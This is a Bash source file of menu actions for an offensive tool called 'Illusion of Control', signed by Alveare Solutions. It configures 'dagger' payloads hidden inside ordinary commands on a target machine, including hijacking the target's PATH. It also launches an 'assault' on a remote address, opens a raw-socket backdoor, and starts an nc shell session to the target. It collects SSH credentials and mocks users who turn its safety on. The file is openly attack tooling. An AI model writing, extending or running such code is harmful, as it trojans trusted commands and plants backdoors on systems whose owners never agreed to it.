#!/bin/bash
#
# Regards, the Alveare Solutions society.
#
# ACTIONS

function action_edit_command_file () {
    local FILE_PATH="${IOC_IMPORTS['command-file']}"
    echo
    if [ -z "${IOC_IMPORTS['cmd-file']}" ]; then
        warning_msg "No command file imported. Using default"\
            "(${YELLOW}${MD_DEFAULT['cmd-file']}${RESET})."
        local FILE_PATH="${MD_DEFAULT['cmd-file']}"
    fi
    info_msg "Opening IOC command file (${YELLOW}$FILE_PATH${RESET})"\
        "for editing using (${MAGENTA}${MD_DEFAULT['file-editor']}${RESET})..."
    ${MD_DEFAULT['file-editor']} $FILE_PATH
    EXIT_CODE=$?
    if [ $EXIT_CODE -ne 0 ]; then
        nok_msg "Something went wrong."\
            "Could not edit command file (${RED}$FILE_PATH${RESET})."
    else
        check_file_empty "$FILE_PATH"
        if [ $? -eq 0 ]; then
            warning_msg "Command file (${RED}$FILE_PATH${RESET}) is empty."
            return 3
        fi
        ok_msg "Successfully edited command (${GREEN}$FILE_PATH${RESET})."
    fi
    return $EXIT_CODE
}

function action_set_ioc_path_directory () {
    echo; info_msg "Type absolute directory path or (${MAGENTA}.back${RESET})."
    while :
    do
        DIR_PATH=`fetch_data_from_user 'DirectoryPath'`
        local EXIT_CODE=$?
        echo
        if [ $EXIT_CODE -ne 0 ]; then
            info_msg "Aborting action."
            return 0
        fi
        if [[ "${MD_DEFAULT['target']}" == 'local' ]]; then
            check_directory_exists "$DIR_PATH"
            if [ $? -ne 0 ]; then
                warning_msg "Directory (${RED}$DIR_PATH${RESET}) does not exists."
                echo; continue
            fi
        fi
        break
    done
    set_ioc_path_directory "$DIR_PATH"
    EXIT_CODE=$?
    if [ $EXIT_CODE -ne 0 ]; then
        nok_msg "Something went wrong."\
            "Could not set (${RED}$DIR_PATH${RESET}) as PATH directory."
    else
        ok_msg "Successfully staged directory (${GREEN}$DIR_PATH${RESET})"\
            "to be set to PATH."
    fi
    return $EXIT_CODE
}

function action_set_ioc_order () {
    CLOAK_ORDER_OPTIONS=( 'pre-exec' 'post-exec' )
    echo; info_msg "Select dagger execution order in command cloak:
        "
    ORDER=`fetch_selection_from_user "CloakOrder" "${CLOAK_ORDER_OPTIONS[@]}"`
    if [ $? -ne 0 ]; then
        echo; info_msg "Aborting action."
            return 0
    fi
    echo; set_ioc_cloak_order "$ORDER"
    EXIT_CODE=$?
    if [ $EXIT_CODE -ne 0 ]; then
        nok_msg "Something went wrong."\
            "Could not set IOC cloak order to (${RED}$ORDER${RESET})."
    else
        ok_msg "Successfully set IOC cloak order to (${GREEN}$ORDER${RESET})"
    fi
    return $EXIT_CODE
}

function action_start_ioc_assault () {
    ADDR=`fetch_remote_address_from_connection_details "${MD_DEFAULT['conn-details']}"`
    PORT=`fetch_remote_port_from_connection_details "${MD_DEFAULT['conn-details']}"`
    echo; info_msg "Starting IOC assault on ($ADDR) using port ($PORT)."\
        "Press (${MAGENTA}Ctrl-C${RESET}) to terminate before completion.
        "
    COMMAND_STRING=`format_illusion_of_control_command_string`
    if [ $? -ne 0 ]; then
        echo; error_msg "Something went wrong."\
            "Could not format illusion of control command string."\
            "Details: ($COMMAND_STRING)"
        return 1
    fi
    check_safety_on
    if [ $? -eq 0 ]; then
        warning_msg "Safety is (${GREEN}ON${RESET})."\
            "IOC assault is not beeing performed."
        return 2
    fi
    trap "echo; done_msg 'Terminating IOC assault.' || true" INT
    ${IOC_CARGO['illusion-of-control']} $COMMAND_STRING
    trap - INT || true
    return $?
}

function action_interactive_raw_socket_session () {
    ADDR=`fetch_remote_address_from_connection_details "${MD_DEFAULT['conn-details']}"`
    PORT=`fetch_remote_port_from_connection_details "${MD_DEFAULT['conn-details']}"`
    echo; ping $ADDR -c 3 &> /dev/null
    if [ $? -ne 0 ]; then
        info_msg "Target machine (${RED}$ADDR${RESET}) is offline."\
            "Aborting action."
            return 0
    else
        info_msg "Target machine (${GREEN}$ADDR${RESET}) is online."
    fi
    info_msg "Starting interactive remote session with"\
        "($ADDR) on port ($PORT) -"
    trap "echo; done_msg 'Terminating remote shell session.' || true" INT
    nc "$ADDR" $PORT
    local EXIT_CODE=$?
    trap - INT || true
    return $?
}

function action_open_raw_socket_backdoor () {
    echo; info_msg "Opening raw socket backdoor."\
        "Press (${MAGENTA}Ctrl-C${RESET}) to terminate."
    COMMAND_STRING=`format_raw_socket_backdoor_command_string`
    if [ $? -ne 0 ]; then
        echo; error_msg "Something went wrong."\
            "Could not format raw socket backdoor command string."\
            "Details: ($COMMAND_STRING)"
        return 1
    fi
    trap "echo; done_msg 'Terminating backdoor server.' || true" INT
    ${IOC_CARGO['raw-backdoor']} $COMMAND_STRING
    trap - INT || true
    return $?
}

function action_ioc_help () {
    echo; info_msg "Select cargo script to view instructions for:
    "
    CLI_CARGO=`fetch_selection_from_user "Help" ${!IOC_CARGO[@]}`
    if [ $? -ne 0 ]; then
        return 1
    fi
    ${IOC_CARGO[$CLI_CARGO]} --help
    return $?
}

function action_set_connection_timeout () {
    echo; info_msg "Type number of seconds or (${MAGENTA}.back${RESET})."
    while :
    do
        TIMEOUT_SECONDS=`fetch_data_from_user 'CnxTimeout'`
        if [ $? -ne 0 ]; then
            echo; info_msg "Aborting action."
            return 0
        fi
        check_value_is_number $TIMEOUT_SECONDS
        if [ $? -ne 0 ]; then
            warning_msg "Number of seconds until connection timeout required,"\
                "not (${RED}$TIMEOUT_SECONDS${RESET})."
            echo; continue
        fi; break
    done
    echo; set_ioc_connection_timeout $TIMEOUT_SECONDS
    EXIT_CODE=$?
    if [ $EXIT_CODE -ne 0 ]; then
        nok_msg "Something went wrong."\
            "Could not set (${BLUE}$SCRIPT_NAME${RESET}) connection timeout to"\
            "(${RED}$TIMEOUT_SECONDS${RESET}) seconds."
    else
        ok_msg "Successfully set (${BLUE}$SCRIPT_NAME${RESET}) connection"\
            "timeout to (${GREEN}$TIMEOUT_SECONDS${RESET})."
    fi
    return $EXIT_CODE
}

function action_import_command_file () {
    echo; info_msg "Type absolute file path or (${MAGENTA}.back${RESET})."
    while :
    do
        FILE_PATH=`fetch_data_from_user 'FilePath'`
        local EXIT_CODE=$?
        echo
        if [ $EXIT_CODE -ne 0 ]; then
            info_msg "Aborting action."
            return 0
        fi
        check_file_exists "$FILE_PATH"
        if [ $? -ne 0 ]; then
            warning_msg "File (${RED}$FILE_PATH${RESET}) does not exists."
            echo; continue
        fi; break
    done
    set_imported_command_file "$FILE_PATH"
    EXIT_CODE=$?
    if [ $EXIT_CODE -ne 0 ]; then
        nok_msg "Something went wrong."\
            "Could not import command file (${RED}$FILE_PATH${RESET})."
    else
        ok_msg "Successfully imported command file (${GREEN}$FILE_PATH${RESET})."
    fi
    return $EXIT_CODE
}

function action_set_setup_path_flag () {
    FLAG_OPTIONS=( 'on' 'off' )
    echo; qa_msg "Export (${BLUE}${MD_DEFAULT['path-dir']}${RESET})"\
        "to PATH on the target machine?"
    fetch_ultimatum_from_user "Y/N"
    EXIT_CODE=$?
    case $EXIT_CODE in
        0)
            local FLAG='on'
            ;;
        1)
            local FLAG='off'
            ;;
    esac
    echo; set_ioc_path_setup_flag "$FLAG"
    EXIT_CODE=$?
    if [ $EXIT_CODE -ne 0 ]; then
        nok_msg "Something went wrong."\
            "Could not set IOC PATH setup flag to (${RED}$FLAG${RESET})."
    else
        ok_msg "Successfully set IOC PATH setup flag to"\
            "(${GREEN}$FLAG${RESET})"
    fi
    return $EXIT_CODE
}

function action_set_connection_details () {
    PASS=''
    USER=''
    while :
    do
        echo; info_msg "Type remote port number or (${MAGENTA}.back${RESET})."
        PORT=`fetch_data_from_user 'Port'`
        if [ $? -ne 0 ]; then
            echo; info_msg "Aborting action."
            return 0
        fi
        check_value_is_number $PORT
        if [ $? -ne 0 ]; then
            warning_msg "Invalid port number (${RED}$PORT${RESET})."
            echo; continue
        fi; break
    done
    echo; info_msg "Type remote machine address or (${MAGENTA}.back${RESET})."
    ADDR="`fetch_data_from_user 'Address'`"
    if [ $? -ne 0 ]; then
        echo; info_msg "Aborting action."
        return 0
    fi
    if [[ "${MD_DEFAULT['conn-type']}" == 'ssh' ]]; then
        echo; info_msg "Type remote user name or (${MAGENTA}.back${RESET})."
        USER="`fetch_data_from_user 'User'`"
        if [ $? -ne 0 ]; then
            echo; info_msg "Aborting action."
            return 0
        fi
        echo; info_msg "Type remote user password or (${MAGENTA}.back${RESET})."
        PASS="`fetch_data_from_user 'Password'`"
        if [ $? -ne 0 ]; then
            echo; info_msg "Aborting action."
            return 0
        fi
    fi
    CONNECTION_DETAILS="$USER@$ADDR:$PORT:$PASS"
    echo; set_ioc_connection_details "$CONNECTION_DETAILS"
    EXIT_CODE=$?
    if [ $EXIT_CODE -ne 0 ]; then
        nok_msg "Something went wrong."\
            "Could not set IOC connection details"\
            "(${RED}$CONNECTION_DETAILS${RESET})."
    else
        ok_msg "Successfully set IOC connection details"\
            "(${GREEN}$CONNECTION_DETAILS${RESET})."
    fi
    return $EXIT_CODE
}

function action_set_connection_type () {
    CONNECTION_VALUES=( 'raw' 'ssh' )
    echo; info_msg "Select connection type:
    "
    CONNECTION_TYPE=`fetch_selection_from_user "Connection" ${CONNECTION_VALUES[@]}`
    if [ $? -ne 0 ]; then
        echo; info_msg "Aborting action."
        return 0
    fi
    echo; set_ioc_connection_type "$CONNECTION_TYPE"
    EXIT_CODE=$?
    if [ $EXIT_CODE -ne 0 ]; then
        nok_msg "Something went wrong."\
            "Could not set IOC connection type to"\
            "(${RED}$CONNECTION_TYPE${RESET})."
    else
        ok_msg "Successfully set IOC connection type"\
            "(${GREEN}$CONNECTION_TYPE${RESET})."
    fi
    return $EXIT_CODE
}

function action_set_target () {
    TARGET_VALUES=( 'local' 'remote' )
    echo; info_msg "Select target type:
    "
    TARGET_TYPE=`fetch_selection_from_user "Target" ${TARGET_VALUES[@]}`
    if [ $? -ne 0 ]; then
        echo; info_msg "Aborting action."
        return 0
    fi
    echo; set_ioc_target_type "$TARGET_TYPE"
    EXIT_CODE=$?
    if [ $EXIT_CODE -ne 0 ]; then
        nok_msg "Something went wrong."\
            "Could not set IOC target type (${RED}$TARGET_TYPE${RESET})."
    else
        ok_msg "Successfully set IOC target type"\
            "(${GREEN}$TARGET_TYPE${RESET})."
    fi
    return $EXIT_CODE
}

function action_set_command () {
    echo; info_msg "Type command to cloak or (${MAGENTA}.back${RESET})."
    while :
    do
        COMMAND=`fetch_data_from_user 'Command'`
        if [ $? -ne 0 ]; then
            echo; info_msg "Aborting action."
            return 0
        fi; echo
        if [[ "${MD_DEFAULT['target']}" == 'remote' ]]; then
            info_msg "Target is (${MAGENTA}${MD_DEFAULT['target']}${RESET})."\
                "Can not ensure command (${MAGENTA}$COMMAND${RESET}) exists."
            break
        fi
        check_util_installed "$COMMAND"
        if [ $? -ne 0 ]; then
            warning_msg "Command (${RED}$COMMAND${RESET}) is not installed."
            echo; continue
        fi
        info_msg "Command (${GREEN}$COMMAND${RESET})"\
            "is installed on the local machine."
        break
    done
    set_command_to_cloak "$COMMAND"
    EXIT_CODE=$?
    if [ $EXIT_CODE -ne 0 ]; then
        nok_msg "Something went wrong."\
            "Could not set command to cloak as (${RED}$COMMAND${RESET})."
    else
        ok_msg "Successfully set command to cloak as"\
            "(${GREEN}$COMMAND${RESET})."
    fi
    return $EXIT_CODE
}

function action_set_dagger_file_path () {
    echo; info_msg "Type absolute file path or (${MAGENTA}.back${RESET})."
    while :
    do
        FILE_PATH=`fetch_data_from_user 'FilePath'`
        if [ $? -ne 0 ]; then
            echo; info_msg "Aborting action."
            return 0
        fi
        check_file_exists "$FILE_PATH"
        if [ $? -ne 0 ]; then
            warning_msg "File (${RED}$FILE_PATH${RESET}) does not exists."
            echo; continue
        fi; break
    done
    set_dagger_file "$FILE_PATH"
    EXIT_CODE=$?
    echo; if [ $EXIT_CODE -ne 0 ]; then
        nok_msg "Something went wrong."\
            "Could not set (${RED}$FILE_PATH${RESET}) as"\
            "(${MAGENTA}${MD_DEFAULT['command']}${RESET}) dagger file."
    else
        ok_msg "Successfully set command"\
            "(${MAGENTA}${MD_DEFAULT['command']}${RESET})"\
            "dagger file (${GREEN}$FILE_PATH${RESET})."
    fi
    return $EXIT_CODE
}

function action_install_dependencies () {
    echo
    fetch_ultimatum_from_user "Are you sure about this? ${YELLOW}Y/N${RESET}"
    if [ $? -ne 0 ]; then
        echo; info_msg "Aborting action."
        return 0
    fi
    apt_install_dependencies
    return $?
}

function action_set_temporary_file () {
    echo; info_msg "Type absolute file path or (${MAGENTA}.back${RESET})."
    while :
    do
        FILE_PATH=`fetch_data_from_user 'FilePath'`
        if [ $? -ne 0 ]; then
            echo; info_msg "Aborting action."
            return 0
        fi
        check_file_exists "$FILE_PATH"
        if [ $? -ne 0 ]; then
            warning_msg "File (${RED}$FILE_PATH${RESET}) does not exists."
            echo; continue
        fi; break
    done
    set_temporary_file "$FILE_PATH"
    EXIT_CODE=$?
    echo; if [ $EXIT_CODE -ne 0 ]; then
        nok_msg "Something went wrong."\
            "Could not set (${RED}$FILE_PATH${RESET}) as"\
            "(${BLUE}$SCRIPT_NAME${RESET}) temporary file."
    else
        ok_msg "Successfully set temporary file (${GREEN}$FILE_PATH${RESET})."
    fi
    return $EXIT_CODE
}

function action_set_safety_on () {
    echo; qa_msg "Getting scared, are we?"
    fetch_ultimatum_from_user "${YELLOW}Y/N${RESET}"
    if [ $? -ne 0 ]; then
        echo; info_msg "Aborting action."
        return 0
    fi
    set_safety 'on'
    EXIT_CODE=$?
    echo; if [ $EXIT_CODE -ne 0 ]; then
        nok_msg "Something went wrong."\
            "Could not set (${BLUE}$SCRIPT_NAME${RESET}) safety"\
            "to (${GREEN}ON${RESET})."
    else
        ok_msg "Succesfully set (${BLUE}$SCRIPT_NAME${RESET}) safety"\
            "to (${GREEN}ON${RESET})."
    fi
    return $EXIT_CODE
}

function action_set_safety_off () {
    echo; qa_msg "Taking off the training wheels. Are you sure about this?"
    fetch_ultimatum_from_user "${YELLOW}Y/N${RESET}"
    if [ $? -ne 0 ]; then
        echo; info_msg "Aborting action."
        return 0
    fi
    set_safety 'off'
    EXIT_CODE=$?
    echo; if [ $EXIT_CODE -ne 0 ]; then
        nok_msg "Something went wrong."\
            "Could not set (${BLUE}$SCRIPT_NAME${RESET}) safety"\
            "to (${RED}OFF${RESET})."
    else
        ok_msg "Succesfully set (${BLUE}$SCRIPT_NAME${RESET}) safety"\
            "to (${RED}OFF${RESET})."
    fi
    return $EXIT_CODE
}

function action_set_log_file () {
    echo; info_msg "Type absolute file path or (${MAGENTA}.back${RESET})."
    while :
    do
        FILE_PATH=`fetch_data_from_user 'FilePath'`
        if [ $? -ne 0 ]; then
            echo; info_msg "Aborting action."
            return 0
        fi
        check_file_exists "$FILE_PATH"
        if [ $? -ne 0 ]; then
            warning_msg "File (${RED}$FILE_PATH${RESET}) does not exists."
            echo; continue
        fi; break
    done
    echo; set_log_file "$FILE_PATH"
    EXIT_CODE=$?
    if [ $EXIT_CODE -ne 0 ]; then
        nok_msg "Something went wrong."\
            "Could not set (${RED}$FILE_PATH${RESET}) as"\
            "(${BLUE}$SCRIPT_NAME${RESET}) log file."
    else
        ok_msg "Successfully set (${BLUE}$SCRIPT_NAME${RESET}) log file"\
            "(${GREEN}$FILE_PATH${RESET})."
    fi
    return $EXIT_CODE
}

function action_set_log_lines () {
    echo; info_msg "Type log line number to display or (${MAGENTA}.back${RESET})."
    while :
    do
        LOG_LINES=`fetch_data_from_user 'LogLines'`
        if [ $? -ne 0 ]; then
            echo; info_msg "Aborting action."
            return 0
        fi
        check_value_is_number $LOG_LINES
        if [ $? -ne 0 ]; then
            warning_msg "LogViewer number of lines required,"\
                "not (${RED}$LOG_LINES${RESET})."
            echo; continue
        fi; break
    done
    echo; set_log_lines $LOG_LINES
    EXIT_CODE=$?
    if [ $EXIT_CODE -ne 0 ]; then
        nok_msg "Something went wrong."\
            "Could not set (${BLUE}$SCRIPT_NAME${RESET}) default"\
            "${RED}log lines${RESET} to (${RED}$LOG_LINES${RESET})."
    else
        ok_msg "Successfully set ${BLUE}$SCRIPT_NAME${RESET} default"\
            "${GREEN}log lines${RESET} to (${GREEN}$LOG_LINES${RESET})."
    fi
    return $EXIT_CODE
}

function action_set_file_editor () {
    echo; info_msg "Type file editor name or ${MAGENTA}.back${RESET}."
    while :
    do
        FILE_EDITOR=`fetch_data_from_user 'Editor'`
        if [ $? -ne 0 ]; then
            echo; info_msg "Aborting action."
            return 0
        fi
        check_util_installed "$FILE_EDITOR"
        if [ $? -ne 0 ]; then
            warning_msg "File editor (${RED}$FILE_EDITOR${RESET}) is not installed."
            echo; continue
        fi; break
    done
    set_file_editor "$FILE_EDITOR"
    EXIT_CODE=$?
    echo; if [ $EXIT_CODE -ne 0 ]; then
        nok_msg "Something went wrong."\
            "Could not set (${RED}$FILE_EDITOR${RESET}) as"\
            "(${BLUE}$SCRIPT_NAME${RESET}) default file editor."
    else
        ok_msg "Successfully set default file editor"\
            "(${GREEN}$FILE_EDITOR${RESET})."
    fi
    return $EXIT_CODE
}


